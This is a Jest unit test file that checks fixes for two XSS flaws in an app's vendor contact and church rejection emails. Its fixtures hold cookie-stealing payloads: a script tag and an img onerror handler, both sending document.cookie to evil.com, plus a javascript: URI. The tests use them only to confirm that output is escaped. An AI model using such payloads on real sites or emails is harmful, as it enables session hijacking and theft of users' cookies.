// ============================================================
// OneFlesh — Vendors Service Unit Tests
// Covers: M-01 (XSS in vendor contact email),
//         M-02 (XSS in church rejection email)
// ============================================================

jest.mock('../../src/config/database.js', () => ({
  prisma: {
    vendor: { findUnique: jest.fn() },
    user: { findUnique: jest.fn() },
    church: { findUnique: jest.fn(), update: jest.fn() },
    $transaction: jest.fn(),
  },
}));

jest.mock('../../src/utils/email.js', () => ({
  sendEmail: jest.fn().mockResolvedValue(undefined),
}));

jest.mock('../../src/config/logger.js', () => ({
  logger: { info: jest.fn(), warn: jest.fn(), error: jest.fn() },
}));

jest.mock('../../src/modules/notifications/notifications.service.js', () => ({
  createNotification: jest.fn().mockResolvedValue(undefined),
  notifyNewInterest: jest.fn().mockResolvedValue(undefined),
}));

// ─── Imports ─────────────────────────────────────────────────

import { prisma } from '../../src/config/database.js';
import { sendEmail } from '../../src/utils/email.js';
import { AppError } from '../../src/middleware/errorHandler.js';
import * as vendorsService from '../../src/modules/vendors/vendors.service.js';
import * as churchesService from '../../src/modules/churches/churches.service.js';

const mockPrismaVendor = prisma.vendor as jest.Mocked<typeof prisma.vendor>;
const mockPrismaUser = prisma.user as jest.Mocked<typeof prisma.user>;
const mockPrismaChurch = prisma.church as jest.Mocked<typeof prisma.church>;
const mockSendEmail = sendEmail as jest.MockedFunction<typeof sendEmail>;

// ─── Fixtures ─────────────────────────────────────────────────

const APPROVED_VENDOR = {
  id: 'vendor-1',
  businessName: 'Grace Photography',
  category: 'PHOTOGRAPHY',
  location: 'Hyderabad',
  city: 'Hyderabad',
  state: 'Telangana',
  ownerName: 'Thomas Philip',
  phone: '9876543210',
  email: 'thomas@grace.photo',
  website: 'https://gracephoto.in',
  priceFrom: '25000',
  priceType: 'per day',
  status: 'APPROVED',
  deletedAt: null,
  ownerUserId: 'user-vendor-1',
  church: { name: 'Grace Church' },
};

const REQUESTING_PASTOR = {
  id: 'pastor-A',
  email: 'pastor@grace.in',
  church: {
    name: 'Grace Reformed Church',
    pastorName: 'Rev. Samuel Raju',
    pastorEmail: 'pastor@grace.in',
  },
};

const CHURCH = {
  id: 'church-1',
  name: 'Trinity Church',
  pastorName: 'Rev. John Thomas',
  pastorEmail: 'john@trinity.in',
  status: 'PENDING',
  rejectionReason: null,
};

// ─── M-01: XSS in Vendor Contact Email ────────────────────────

describe('M-01 · contactVendor — HTML injection in email template', () => {
  beforeEach(() => jest.clearAllMocks());

  it('⚠️  FAILS BEFORE FIX — vendor businessName is embedded unescaped in email HTML', async () => {
    const maliciousVendor = {
      ...APPROVED_VENDOR,
      // XSS payload in businessName
      businessName: '<script>document.location="https://evil.com?c="+document.cookie</script>',
    };
    mockPrismaVendor.findUnique.mockResolvedValue(maliciousVendor as never);
    mockPrismaUser.findUnique.mockResolvedValue(REQUESTING_PASTOR as never);

    await vendorsService.contactVendor('vendor-1', 'pastor-A');

    expect(mockSendEmail).toHaveBeenCalledTimes(1);
    const callArgs = mockSendEmail.mock.calls[0]![0];
    const html = callArgs.html as string;

    // After fix: should NOT contain raw <script> tags in email body
    // Before fix: the raw script tag IS present — test FAILS
    expect(html).not.toContain('<script>');
    // The business name should appear but HTML-escaped
    expect(html).toContain('&lt;script&gt;');
  });

  it('⚠️  FAILS BEFORE FIX — vendor website is embedded in href without validation', async () => {
    const maliciousVendor = {
      ...APPROVED_VENDOR,
      // javascript: URI scheme injection
      website: 'javascript:alert(document.cookie)',
    };
    mockPrismaVendor.findUnique.mockResolvedValue(maliciousVendor as never);
    mockPrismaUser.findUnique.mockResolvedValue(REQUESTING_PASTOR as never);

    await vendorsService.contactVendor('vendor-1', 'pastor-A');

    const html = mockSendEmail.mock.calls[0]![0].html as string;

    // After fix: href should not accept javascript: scheme
    // Before fix: the raw href is present — test FAILS
    expect(html).not.toContain('href="javascript:');
  });

  it('✅ sends email to the requesting pastor (correct flow for safe vendor)', async () => {
    mockPrismaVendor.findUnique.mockResolvedValue(APPROVED_VENDOR as never);
    mockPrismaUser.findUnique.mockResolvedValue(REQUESTING_PASTOR as never);

    await vendorsService.contactVendor('vendor-1', 'pastor-A');

    expect(mockSendEmail).toHaveBeenCalledWith(
      expect.objectContaining({
        to: REQUESTING_PASTOR.email,
        subject: expect.stringContaining('Grace Photography'),
      }),
    );
  });

  it('✅ throws 404 when vendor is not found', async () => {
    mockPrismaVendor.findUnique.mockResolvedValue(null as never);

    await expect(vendorsService.contactVendor('nonexistent', 'pastor-A')).rejects.toThrow(AppError);
  });

  it('✅ throws 422 when vendor is not approved', async () => {
    mockPrismaVendor.findUnique.mockResolvedValue({
      ...APPROVED_VENDOR,
      status: 'PENDING',
    } as never);

    await expect(vendorsService.contactVendor('vendor-1', 'pastor-A')).rejects.toThrow(AppError);
  });
});

// ─── M-02: XSS in Church Rejection Email ──────────────────────

describe('M-02 · rejectChurch — HTML injection in rejection email', () => {
  beforeEach(() => jest.clearAllMocks());

  it('⚠️  FAILS BEFORE FIX — rejection reason is embedded unescaped in email HTML', async () => {
    mockPrismaChurch.findUnique.mockResolvedValue(CHURCH as never);
    mockPrismaChurch.update.mockResolvedValue({
      ...CHURCH,
      status: 'REJECTED',
      rejectionReason: 'XSS payload',
    } as never);

    // Attacker-controlled rejection reason (admin may paste from external source)
    const maliciousReason =
      'Doctrinal concerns. <img src=x onerror="fetch(\'https://evil.com/?cookie=\'+document.cookie)">';

    await churchesService.rejectChurch('church-1', maliciousReason, 'admin-1');

    // Allow async email to fire (it uses .catch())
    await new Promise((resolve) => setTimeout(resolve, 10));

    expect(mockSendEmail).toHaveBeenCalledTimes(1);
    const html = mockSendEmail.mock.calls[0]![0].html as string;

    // After fix: onerror handler should be escaped, not executable
    // Before fix: raw onerror attribute IS present — test FAILS
    expect(html).not.toContain('onerror=');
    // The reason text should still appear, but escaped
    expect(html).toContain('Doctrinal concerns');
  });

  it('✅ throws 404 when church is not found', async () => {
    mockPrismaChurch.findUnique.mockResolvedValue(null as never);

    await expect(churchesService.rejectChurch('nonexistent', 'reason here too', 'admin-1')).rejects.toThrow(AppError);
  });

  it('✅ throws 409 when church is already rejected', async () => {
    mockPrismaChurch.findUnique.mockResolvedValue({
      ...CHURCH,
      status: 'REJECTED',
    } as never);

    await expect(churchesService.rejectChurch('church-1', 'reason here too', 'admin-1')).rejects.toThrow(AppError);
  });
});
